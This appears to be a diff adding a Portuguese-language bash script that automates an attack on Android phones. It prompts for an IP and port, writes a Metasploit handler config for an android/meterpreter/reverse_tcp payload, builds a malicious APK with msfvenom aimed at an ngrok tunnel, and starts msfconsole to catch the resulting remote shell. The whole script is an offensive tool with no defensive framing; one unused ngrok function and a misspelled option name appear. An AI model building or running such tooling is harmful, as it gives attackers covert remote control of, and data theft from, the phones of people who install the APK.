@@ -1,0 +1,84 @@
+#!/bin/bash
+
+green="\e[01;32m"
+blue="\e[01;34m"
+red="\e[01;31m"
+yellow="\e[01;33m"
+std="\e[00m"
+
+
+prepare_info() {
+    clear
+    until grep -E ^[0-9.]+$ <<< $host_local;
+    do
+        echo -e $yellow"\nPor favor, informe apenas dados válidos, qualquer outro tipo que\nnão esteja de acordo com o que foi pedido, causará error na aplização\ne certamente ela não funcionará.\n"$std
+        echo -ne $yellow"Informe o ip da máquina local: "$std; read host_local
+        clear
+    done
+    clear
+    until grep -E ^[0-9]+$ <<< $port_local;
+    do
+        echo -e $yellow"\nPor favor, informe apenas dados válidos, qualquer outro tipo que\nnão esteja de acordo com o que foi pedido, causará error na aplização\ne certamente ela não funcionará.\n"$std
+        echo -ne $yellow"Informe a porta da máquina local: "$std; read port_local
+        clear
+    done
+    rm vendor/msfconfig/setConfig.rc 2>/dev/null
+    echo "use exploit/multi/handler" >> vendor/msfconfig/setConfig.rc
+    clear
+    echo "set payload android/meterpreter/reverse_tcp" >> vendor/msfconfig/setConfig.rc
+    clear    
+    echo "set LHOST $host_local" >> vendor/msfconfig/setConfig.rc
+    clear
+    echo "set LPORT $port_local" >> vendor/msfconfig/setConfig.rc
+    clear
+    echo "set Exi0nSession false" >> vendor/msfconfig/setConfig.rc
+    clear
+    echo "clear" >> vendor/msfconfig/setConfig.rc
+    clear
+    echo "exploit -j" >> vendor/msfconfig/setConfig.rc
+    clear
+}
+
+clear
+echo -e $green"Iniciando preparativos para o ataque..."$std
+sleep 3
+
+init_ngrok() {
+    gnome-terminal --window --geometry=90x29 --hide-menubar -x bash -c "/opt/ngrok/ngrok tcp 4444" &>/dev/null
+}
+
+create_payload() {
+    clear
+    echo -ne $yellow"Informe o nome do payload: "$std; read name_payload
+    echo -ne $yellow"Informe o Host do ngrok: "$std; read host
+    until grep -E ^[0-9]+$ <<< $port;
+    do
+        echo -ne $yellow"Informe o Port do ngrok: "$std; read port
+    done
+    clear
+    echo -e $green"Criando o payload..."$std
+    sleep 2
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port > payload/$name_payload.apk &>/dev/null
+    clear
+    echo -e $green"Payload criada com sucesso!"$std
+    sleep 3
+    clear
+    
+}
+
+config_msfconsole() {
+    clear
+    echo -e $green"Iniciando banco de dados postgresql..."$std
+    msfdb init &>/dev/null
+    sleep 2
+    echo -e $green"Iniciando msfconsole..."$std
+    sleep 2
+    gnome-terminal --window --geometry=90x29 --hide-menubar -x bash -c "msfconsole -r vendor/msfconfig/setConfig.rc"
+    clear
+}
+
+
+
+prepare_info
+create_payload
+config_msfconsole
